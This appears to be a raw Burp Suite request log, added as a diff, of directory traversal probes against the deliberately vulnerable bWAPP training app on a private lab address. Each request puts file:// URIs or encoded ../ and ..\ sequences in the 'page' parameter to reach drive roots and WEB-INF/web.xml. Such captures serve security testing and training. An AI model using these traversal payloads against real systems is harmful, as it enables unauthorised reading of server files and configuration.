+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=d%3A%2F HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=file%3A%2F%2F%2Fd%3A%2F HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=file%3A%2F%2F%2Fd%3A%5C HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=file%3A%5C%5C%5Cd%3A%5C HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=file%3A%5C%5C%5Cd%3A%2F HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=WEB-INF%2Fweb.xml HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=WEB-INF%5Cweb.xml HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=%2FWEB-INF%2Fweb.xml HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=%5CWEB-INF%5Cweb.xml HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=..%2FWEB-INF%2Fweb.xml HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=..%5CWEB-INF%5Cweb.xml HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=%2F..%2FWEB-INF%2Fweb.xml HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=%5C..%5CWEB-INF%5Cweb.xml HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=..%2F..%2FWEB-INF%2Fweb.xml HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=..%5C..%5CWEB-INF%5Cweb.xml HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=%2F..%2F..%2FWEB-INF%2Fweb.xml HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=%5C..%5C..%5CWEB-INF%5Cweb.xml HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=..%2F..%2F..%2FWEB-INF%2Fweb.xml HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=..%5C..%5C..%5CWEB-INF%5Cweb.xml HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=%2F..%2F..%2F..%2FWEB-INF%2Fweb.xml HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=%5C..%5C..%5C..%5CWEB-INF%5Cweb.xml HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=thishouldnotexistandhopefullyitwillnot HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=directory_traversal_1.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=%2Fdirectory_traversal_1.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
+GET /bWAPP/directory_traversal_1.php?page=%5Cdirectory_traversal_1.php HTTP/1.1
+Host: 192.168.118.128
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0
+Pragma: no-cache
+Cache-Control: no-cache
+Cookie: PHPSESSID=p42ab9oounakb7n2ejdfmbbtq5; security_level=2
+Connection: close
+X-Burp-Comment:   |  
+
+
+========
